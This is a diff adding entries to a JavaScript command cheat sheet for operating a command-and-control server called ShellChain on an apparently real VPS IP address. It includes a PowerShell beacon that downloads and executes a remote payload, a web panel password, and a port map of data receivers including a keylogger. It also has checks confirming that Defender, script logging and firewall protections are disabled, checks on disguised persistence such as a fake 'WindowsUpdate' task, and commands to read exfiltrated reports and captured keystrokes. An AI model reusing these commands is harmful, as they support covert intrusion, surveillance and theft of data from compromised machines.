@@ -3824,6 +3824,372 @@ const COMMANDS = [
     tags: ["ps", "lateral", "recon"],
     accent: "#00f0ff"
   },
+  // ═══════════════════════════════════════════════════════════════
+  // SHELLCHAIN C2 - Port 5555 (landing), 5700-5799 (migration), 8888 (web), 9999 (CLI)
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[SHELLCHAIN] Start ShellChain C2",
+    desc: "Starts the full ShellChain C2 server. Landing:5555, Web:8888, CLI:9999, Migration:5700-5799. Systemd managed.",
+    code: "systemctl start shellchain",
+    tags: ["linux", "vps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[SHELLCHAIN] Check ShellChain Status",
+    desc: "Verify ShellChain is running. Should show active (running).",
+    code: "systemctl status shellchain",
+    tags: ["linux", "vps", "c2", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[SHELLCHAIN] View ShellChain Logs",
+    desc: "Stream ShellChain logs in real-time. Shows connections, migrations, commands.",
+    code: "journalctl -u shellchain -f",
+    tags: ["linux", "vps", "c2", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[SHELLCHAIN] Web Panel Access",
+    desc: "Access ShellChain web dashboard. Password is 668340 (from systemd env).",
+    code: "# URL: http://168.144.166.97:8888\n# Password: 668340",
+    tags: ["linux", "vps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[SHELLCHAIN] CLI Access (ncat)",
+    desc: "Connect to ShellChain raw TCP CLI. Commands: sessions, select N, back, exit.",
+    code: "nc 168.144.166.97 9999",
+    tags: ["linux", "vps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[SHELLCHAIN] Beacon to ShellChain",
+    desc: "Download and execute ShellChain beacon. Connects to port 5555, auto-migrates to dedicated port.",
+    code: "IEX(IWR http://168.144.166.97:8888/payload.ps1 -UseBasicParsing)",
+    tags: ["ps", "c2", "evasion"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[SHELLCHAIN] Verify All Ports",
+    desc: "Check all ShellChain ports are listening. Should show 5555, 8888, 9999.",
+    code: "ss -tlnp | grep -E '5555|8888|9999'",
+    tags: ["linux", "vps", "c2", "recon"],
+    accent: "#00f0ff"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // VPS PORT MAP - Complete service mapping
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[VPS-MAP] Full Port Reference",
+    desc: "Complete VPS port-to-service mapping. Use to verify architecture or troubleshoot.",
+    code: "# C2 HANDLERS\n# 4444  - c2_multi.py (tmux:c2)\n# 5555  - shellchain landing\n# 5700-5799 - shellchain migration\n# 8888  - shellchain web panel\n# 9999  - shellchain CLI\n\n# RECEIVERS\n# 8080  - receiver.py (main)\n# 8081  - killchain_receiver.py\n# 8082  - receiver_pro.py\n# 8083  - catch_all.py (keylogger)\n\n# HTTP SERVERS\n# 81    - http.server (ad-hoc)\n# 8889  - http.server (systemd)",
+    tags: ["reference", "vps"],
+    accent: "#607d8b"
+  },
+  {
+    title: "[VPS-MAP] Check All Services Running",
+    desc: "One command to verify all VPS C2/receiver services. Should show all ports.",
+    code: "ss -tlnp | grep -E '4444|5555|8080|8081|8082|8083|8888|8889|9999' | sort -t: -k2 -n",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00f0ff"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // DEFENDER - GET commands for each SET command
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[DEFENDER-GET] Check Realtime Protection",
+    desc: "Returns True if disabled, False if enabled. Verify after Set-MpPreference -DisableRealtimeMonitoring.",
+    code: "(Get-MpPreference).DisableRealtimeMonitoring",
+    tags: ["defender", "ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[DEFENDER-GET] Check Behavior Monitoring",
+    desc: "Returns True if disabled. Verify after DisableBehaviorMonitoring.",
+    code: "(Get-MpPreference).DisableBehaviorMonitoring",
+    tags: ["defender", "ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[DEFENDER-GET] Check BlockAtFirstSeen",
+    desc: "Returns True if disabled. Verify after DisableBlockAtFirstSeen.",
+    code: "(Get-MpPreference).DisableBlockAtFirstSeen",
+    tags: ["defender", "ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[DEFENDER-GET] Check IOAV Protection",
+    desc: "Returns True if disabled. Verify after DisableIOAVProtection.",
+    code: "(Get-MpPreference).DisableIOAVProtection",
+    tags: ["defender", "ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[DEFENDER-GET] Check Archive Scanning",
+    desc: "Returns True if disabled. Verify after DisableArchiveScanning.",
+    code: "(Get-MpPreference).DisableArchiveScanning",
+    tags: ["defender", "ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[DEFENDER-GET] Check Script Scanning",
+    desc: "Returns True if disabled. Verify after DisableScriptScanning (AMSI).",
+    code: "(Get-MpPreference).DisableScriptScanning",
+    tags: ["defender", "ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[DEFENDER-GET] Check IPS",
+    desc: "Returns True if disabled. Verify after DisableIntrusionPreventionSystem.",
+    code: "(Get-MpPreference).DisableIntrusionPreventionSystem",
+    tags: ["defender", "ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[DEFENDER-GET] All Preferences",
+    desc: "Dumps all Defender preferences. Long output but complete picture.",
+    code: "Get-MpPreference | Format-List",
+    tags: ["defender", "ps", "recon"],
+    accent: "#00f0ff"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // FIREWALL - GET commands for SET commands
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[FIREWALL-GET] Check All Profiles",
+    desc: "Shows if Domain/Private/Public firewall is enabled. Verify after Set-NetFirewallProfile.",
+    code: "Get-NetFirewallProfile | Select Name, Enabled | Format-Table",
+    tags: ["ps", "firewall", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[FIREWALL-GET] Check Specific Rule",
+    desc: "Check if a rule exists by name. Change 'Allow4444' to your rule name.",
+    code: "Get-NetFirewallRule -DisplayName 'Allow4444' | Select Enabled, Direction, Action",
+    tags: ["ps", "firewall", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[FIREWALL-GET] List Port Rules",
+    desc: "Shows all inbound rules with port numbers. Good for auditing.",
+    code: "Get-NetFirewallRule -Direction Inbound | Get-NetFirewallPortFilter | Where LocalPort -ne $null | Select LocalPort, Protocol",
+    tags: ["ps", "firewall", "recon"],
+    accent: "#00f0ff"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // PERSISTENCE - VERIFY commands
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[PERSIST-VERIFY] Check Registry Run Key (HKCU)",
+    desc: "Lists all HKCU Run values. Verify user-level persistence.",
+    code: "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' | Format-List",
+    tags: ["ps", "persist", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[PERSIST-VERIFY] Check Registry Run Key (HKLM)",
+    desc: "Lists all HKLM Run values. Verify system-level persistence.",
+    code: "Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' | Format-List",
+    tags: ["ps", "persist", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[PERSIST-VERIFY] Check Scheduled Task Exists",
+    desc: "Check if specific scheduled task exists. Change 'WindowsUpdate' to your task name.",
+    code: "schtasks /query /tn 'WindowsUpdate' 2>$null; if ($?) { 'Task EXISTS' } else { 'Task NOT FOUND' }",
+    tags: ["cmd", "persist", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[PERSIST-VERIFY] Check Service Exists",
+    desc: "Check if specific service exists. Change 'WindowsDefenderUpdate' to your service name.",
+    code: "Get-Service 'WindowsDefenderUpdate' -ErrorAction SilentlyContinue | Select Name, Status, StartType",
+    tags: ["ps", "persist", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[PERSIST-VERIFY] List All WMI Subscriptions",
+    desc: "Lists all WMI event filters and consumers. Verify WMI persistence.",
+    code: "Get-WmiObject -Namespace root/subscription -Class __EventFilter | Select Name\nGet-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Select Name, CommandLineTemplate",
+    tags: ["ps", "persist", "recon"],
+    accent: "#00f0ff"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // EVASION - VERIFY commands
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[EVASION-VERIFY] Check Execution Policy",
+    desc: "Shows execution policy for all scopes. Verify bypass worked.",
+    code: "Get-ExecutionPolicy -List",
+    tags: ["ps", "evasion", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[EVASION-VERIFY] Check Language Mode",
+    desc: "Should show FullLanguage. If ConstrainedLanguage, need bypass.",
+    code: "$ExecutionContext.SessionState.LanguageMode",
+    tags: ["ps", "evasion", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[EVASION-VERIFY] Check ScriptBlock Logging",
+    desc: "Should be 0 (disabled) or error (key doesn't exist).",
+    code: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -ErrorAction SilentlyContinue",
+    tags: ["ps", "evasion", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[EVASION-VERIFY] Check Module Logging",
+    desc: "Should be 0 (disabled) or error (key doesn't exist).",
+    code: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging' -Name EnableModuleLogging -ErrorAction SilentlyContinue",
+    tags: ["ps", "evasion", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[EVASION-VERIFY] Check Transcription",
+    desc: "Should be 0 (disabled) or error (key doesn't exist).",
+    code: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Name EnableTranscripting -ErrorAction SilentlyContinue",
+    tags: ["ps", "evasion", "recon"],
+    accent: "#00f0ff"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // VPS SERVICES - systemctl commands
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[VPS-SVC] Start All C2 Services",
+    desc: "Starts all C2 and receiver services via systemd.",
+    code: "systemctl start shellchain receiver http8889",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[VPS-SVC] Stop All C2 Services",
+    desc: "Stops all C2 and receiver services.",
+    code: "systemctl stop shellchain receiver http8889",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[VPS-SVC] Restart ShellChain",
+    desc: "Restarts ShellChain. Use when making config changes.",
+    code: "systemctl restart shellchain",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[VPS-SVC] Check All Service Status",
+    desc: "Quick status check of all C2/receiver services.",
+    code: "systemctl is-active shellchain receiver http8889 killchain",
+    tags: ["linux", "vps", "c2", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[VPS-SVC] PM2 Status",
+    desc: "Check PM2 managed processes (Ghost-Scraper, palisade-web).",
+    code: "pm2 list",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[VPS-SVC] PM2 Logs",
+    desc: "View logs from PM2 processes.",
+    code: "pm2 logs --lines 50",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00f0ff"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // TMUX MANAGEMENT
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[TMUX] List Sessions",
+    desc: "Shows all tmux sessions. Look for 'c2' session.",
+    code: "tmux list-sessions",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TMUX] Attach to C2",
+    desc: "Attach to c2_multi.py session.",
+    code: "tmux attach -t c2",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TMUX] Create C2 Session",
+    desc: "Create new c2 session if not exists.",
+    code: "tmux new -s c2 'python3 /opt/c2_multi.py 4444'",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TMUX] Kill Session",
+    desc: "Kill a specific tmux session. Change 'c2' to session name.",
+    code: "tmux kill-session -t c2",
+    tags: ["linux", "vps"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // UFW FIREWALL (VPS)
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[UFW] Show Status",
+    desc: "Shows all UFW rules with numbers. Use numbers for delete.",
+    code: "ufw status numbered",
+    tags: ["linux", "vps", "firewall"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[UFW] Allow New Port",
+    desc: "Opens a new port. Change 9000 to your port.",
+    code: "ufw allow 9000/tcp",
+    tags: ["linux", "vps", "firewall"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[UFW] Delete Rule by Number",
+    desc: "Delete rule. Get number from 'ufw status numbered'. Change 5 to rule number.",
+    code: "ufw delete 5",
+    tags: ["linux", "vps", "firewall"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[UFW] Reload",
+    desc: "Reload UFW after changes.",
+    code: "ufw reload",
+    tags: ["linux", "vps", "firewall"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // REPORT VIEWING
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[REPORTS] List All Reports",
+    desc: "Lists all exfiltrated reports by date. Newest first.",
+    code: "ls -lt /opt/reports/ | head -20",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[REPORTS] Watch for New Reports",
+    desc: "Live monitor for new report folders.",
+    code: "watch -n 5 'ls -lt /opt/reports/ | head -10'",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[REPORTS] Open Latest Report",
+    desc: "Opens the most recent HTML report in default browser (if GUI) or shows path.",
+    code: "ls -t /opt/reports/*/report.html | head -1",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[REPORTS] Cat Latest Keys",
+    desc: "Shows contents of files in /keys/ from catch_all.py.",
+    code: "cat /keys/*.txt 2>/dev/null | tail -100",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
 ];
 
 const list = document.getElementById('cmdList');
